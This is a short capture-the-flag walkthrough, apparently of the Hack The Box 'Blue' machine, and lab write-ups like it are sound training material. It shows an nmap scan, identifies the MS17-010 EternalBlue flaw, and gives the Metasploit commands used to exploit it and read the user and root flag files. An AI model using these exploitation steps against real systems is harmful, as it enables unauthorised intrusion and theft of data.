
![Blue](https://user-images.githubusercontent.com/66635295/171770325-b049fad5-f2ec-4c7b-8f55-b810338df409.png)

**RECON**
---
**Nmap Scan**
<pre>nmap –p- -A -T4 10.10.10.40</pre>

-allports -version -Aggressive

Port 139 and 445 shows SMB is running  

![nmap](https://user-images.githubusercontent.com/66635295/171770240-22a413e1-86f5-403d-bf28-67498161e951.png)


**Google-Fu**

<pre>Windows 7 Professional 7601 Service Pack 1</pre>

MS17-010 EternalBlue

![google](https://user-images.githubusercontent.com/66635295/171770443-4a2599f6-984b-4cd3-b6dc-1fc910325fa6.png)

![blue](https://user-images.githubusercontent.com/66635295/171770448-d6573efd-0ab3-45cf-8227-4d8145f1321d.png)

**Metasploit Search**
<pre>msfconsole</pre>
<pre>search eternal blue</pre>

![menu](https://user-images.githubusercontent.com/66635295/171770683-7e20277f-35e4-4ee5-b509-54cb7667f10a.png)

**Auxiliary Scan**

<pre>use 3</pre>
<pre>set host</pre>
<pre>run</pre>
Host is likely Vulnerbale
![bluescan](https://user-images.githubusercontent.com/66635295/171771697-0fd5fdd3-a366-482a-b17a-a79db6aec8c2.png)

**ENUMERATION**
---
Eternal Blue Exploit
<pre>use 0</pre>
<pre>set hosts</pre>
<pre>run</pre>
Success 
![win](https://user-images.githubusercontent.com/66635295/171775665-bdea3385-c399-4edf-95da-e0d69317953c.png)

**PRIVILEGE ESCALATION**
---
**Directories**
<pre>shell</pre>
<pre>cd C:/</pre>
<pre>cd Users</pre>
<pre>dir</pre>
![haris](https://user-images.githubusercontent.com/66635295/171775908-10c655f3-e3d4-4331-82bb-fec08256fcff.png)

**User Flag**
<pre>cd haris</pre>
<pre>cd Desktop</pre>
<pre>dir</pre>
<pre>type user.txt</pre>

**Root Flag**
<pre>cd C:/Users/Administrator</pre>
<pre>cd Desktop</pre>
<pre>dir</pre>
<pre>type root.txt</pre>



